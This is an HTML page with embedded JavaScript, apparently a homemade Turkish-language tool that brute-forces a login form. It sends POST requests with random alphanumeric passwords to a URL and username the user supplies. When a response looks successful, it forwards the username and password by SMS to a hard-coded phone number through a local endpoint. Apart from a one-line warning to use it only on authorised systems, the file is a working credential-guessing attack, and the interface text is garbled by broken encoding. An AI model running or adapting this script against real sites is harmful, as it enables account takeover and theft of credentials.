<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>903-NY1X</title>
  <style>
    body { font-family: Arial, sans-serif; background:#121212; color:#eee; padding:20px; }
    input, button { width: 100%; padding: 10px; margin: 8px 0; border-radius: 5px; border:none; }
    button { background:#007bff; color:#fff; font-weight: bold; cursor: pointer; }
    .log { background:#222; max-height: 300px; overflow-y: auto; padding:10px; margin-top:10px; border-radius:5px; white-space: pre-line; }
  </style>
</head>
<body>
  <h2>ğŸ” En Az 6 Karakter Harf+SayÄ± Åifre Deneme (50 Adet)</h2>
  <p><strong>Dikkat!</strong> Sadece izinli olduÄŸun sistemlerde kullan.</p>

  <label>GiriÅŸ SayfasÄ± URL (POST yapÄ±lacak):</label>
  <input id="site" type="text" placeholder="http://localhost:3000/login" autocomplete="off" />

  <label>KullanÄ±cÄ± AdÄ±:</label>
  <input id="username" type="text" placeholder="KullanÄ±cÄ± adÄ±" autocomplete="off" />

  <button onclick="basla()">Denemeye BaÅŸla</button>

  <div id="log" class="log"></div>

  <script>
    const karakterler = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    function rastgeleSifre() {
      const uzunluk = Math.floor(Math.random() * 5) + 6; // 6-10 karakter
      let sifre = "";
      for (let i = 0; i < uzunluk; i++) {
        const rast = Math.floor(Math.random() * karakterler.length);
        sifre += karakterler[rast];
      }
      return sifre;
    }

    async function basla() {
      const site = document.getElementById("site").value.trim();
      const username = document.getElementById("username").value.trim();
      const log = document.getElementById("log");
      log.innerHTML = "";

      if (!site || !username) {
        alert("LÃ¼tfen site URL'si ve kullanÄ±cÄ± adÄ±nÄ± girin.");
        return;
      }

      const denenenSifreler = new Set();

      for (let i = 1; i <= 99999950; i++) {
        let sifre;
        do {
          sifre = rastgeleSifre();
        } while (denenenSifreler.has(sifre));
        denenenSifreler.add(sifre);

        log.innerHTML += `Deneme ${i}: Åifre = "${sifre}"... Deneniyor\n`;
        log.scrollTop = log.scrollHeight;

        const sonuc = await dene(site, username, sifre);

        log.innerHTML += `SonuÃ§: ${sonuc}\n\n`;
        log.scrollTop = log.scrollHeight;

        if (sonuc === "âœ… BAÅARILI") {
          alert(`Åifre bulundu! KullanÄ±cÄ±: ${username} Åifre: ${sifre}`);

          // SMS gÃ¶nderme isteÄŸi
          try {
            const smsResponse = await fetch("http://localhost:3000/sms-gonder", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                numara: "+905365717964",  // Buraya kendi telefon numaranÄ± yaz
                mesaj: `KullanÄ±cÄ±: ${username}, Åifre: ${sifre}`
              })
            });
            const smsSonuc = await smsResponse.json();
            if (smsSonuc.success) {
              log.innerHTML += `âœ… SMS baÅŸarÄ±yla gÃ¶nderildi. SID: ${smsSonuc.sid}\n`;
            } else {
              log.innerHTML += `âŒ SMS gÃ¶nderilemedi: ${smsSonuc.error}\n`;
            }
          } catch(e) {
            log.innerHTML += `âš ï¸ SMS gÃ¶nderme hatasÄ±: ${e.message}\n`;
          }

          break;  // DoÄŸru ÅŸifre bulundu, dÃ¶ngÃ¼yÃ¼ durdur
        }
      }
    }

    async function dene(site, username, password) {
      try {
        const response = await fetch(site, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
        });

        const text = await response.text();

        if (/giriÅŸ baÅŸarÄ±lÄ±|hoÅŸ geldin|welcome/i.test(text)) {
          return "âœ… BAÅARILI";
        }
        return "âŒ BaÅŸarÄ±sÄ±z";
      } catch (e) {
        return `âš ï¸ HATA: ${e.message}`;
      }
    }
  </script>
</body>
</html>
